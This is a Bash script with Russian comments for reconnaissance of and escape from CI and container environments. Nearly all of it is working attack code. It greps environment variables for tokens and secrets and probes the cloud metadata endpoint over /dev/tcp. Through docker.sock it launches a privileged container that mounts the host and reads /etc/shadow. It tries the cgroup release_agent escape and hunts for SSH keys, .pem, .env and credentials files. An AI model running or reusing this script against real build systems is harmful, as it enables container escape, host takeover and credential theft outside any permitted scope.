#!/usr/bin/env bash
# ci_escape_recon.sh — разведка и попытки выхода из CI-подобной среды
set -uo pipefail

OUT="/tmp/ci_escape_$$"
mkdir -p "$OUT"
echo "[*] Артефакты в $OUT"

log() { echo -e "\n[+] $*"; }
warn() { echo -e "\n[!] $*"; }

# 1. Базовая инфа
log "Система и пользователь"
id; uname -a; cat /etc/os-release 2>/dev/null | head -5
echo "ENV:"; env | sort | grep -Ei 'CI|GITHUB|RUNNER|BUILD|TOKEN|SECRET|AWS|AZURE|GCP' || true

# 2. Монтирования и файловая система
log "Монтирования"
mount | tee "$OUT/mounts.txt"
echo "Интересные пути:"
for p in /host /mnt /var/lib/docker /var/run/docker.sock /run/docker.sock /var/run/containerd/containerd.sock /proc/1/root; do
  [ -e "$p" ] && echo "  $p -> $(ls -ld "$p" 2>/dev/null)"
done

# 3. Возможности (capabilities)
log "Capabilities"
if command -v capsh >/dev/null; then capsh --print; else grep Cap /proc/self/status; fi
CAP_EFF=$(grep CapEff /proc/self/status | awk '{print $2}')
echo "CapEff: $CAP_EFF"

# 4. Docker / Containerd сокеты
log "Поиск сокетов контейнеров"
SOCKETS=$(find / -maxdepth 4 -type s \( -name 'docker.sock' -o -name 'containerd.sock' -o -name 'podman.sock' \) 2>/dev/null)
echo "$SOCKETS" | tee "$OUT/sockets.txt"

# 5. Проверка privileged и cgroup
log "Cgroup и privileged"
cat /proc/1/cgroup 2>/dev/null | tee "$OUT/cgroup.txt"
if [ -w /sys/fs/cgroup ]; then echo "/sys/fs/cgroup доступен для записи"; fi

# 6. Сеть
log "Сеть"
ip a 2>/dev/null; ip route 2>/dev/null; cat /etc/resolv.conf
echo "ARP:"; ip neigh 2>/dev/null
echo "Сканируем типовые внутренние адреса (метаданные, шлюз):"
for ip in 169.254.169.254 10.0.0.1 172.17.0.1 192.168.0.1; do
  timeout 1 bash -c "echo > /dev/tcp/$ip/80" 2>/dev/null && echo "  $ip:80 открыт"
  timeout 1 bash -c "echo > /dev/tcp/$ip/443" 2>/dev/null && echo "  $ip:443 открыт"
done

# 7. Попытка эксплойта через docker.sock
if [ -n "$SOCKETS" ]; then
  for sock in $SOCKETS; do
    log "Пробуем docker.sock: $sock"
    if command -v curl >/dev/null; then
      # Создаём привилегированный контейнер с монтированием хоста
      curl -s --unix-socket "$sock" -X POST http://localhost/containers/create \
        -H "Content-Type: application/json" \
        -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}' \
        -o "$OUT/docker_create.json"
      CID=$(grep -o '"Id":"[^"]*"' "$OUT/docker_create.json" | cut -d'"' -f4)
      if [ -n "$CID" ]; then
        curl -s --unix-socket "$sock" -X POST "http://localhost/containers/$CID/start"
        echo "Контейнер $CID запущен. Логи:"
        sleep 1
        curl -s --unix-socket "$sock" "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
      fi
    fi
  done
fi

# 8. Попытка выхода через cgroup release_agent (если privileged и cgroup v1)
if [ "$(id -u)" = "0" ] && [ -w /sys/fs/cgroup ] && [ -f /sys/fs/cgroup/release_agent ]; then
  log "Пробуем cgroup release_agent escape"
  mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || true
  mkdir -p /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
  echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent
  cat > /cmd <<'EOF'
#!/bin/sh
ps aux > /output
EOF
  chmod +x /cmd
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  sleep 1
  cat /output 2>/dev/null && echo "[+] Escape сработал" || echo "[-] Escape не удался"
fi

# 9. Поиск паролей и ключей
log "Поиск чувствительных файлов"
find / -maxdepth 4 \( -name 'id_rsa' -o -name '*.pem' -o -name '.env' -o -name 'credentials' \) 2>/dev/null | tee "$OUT/sensitive.txt"

# 10. Sudo без пароля
log "Sudo"
sudo -n -l 2>/dev/null || echo "sudo без пароля недоступен"

log "Готово. Результаты в $OUT"
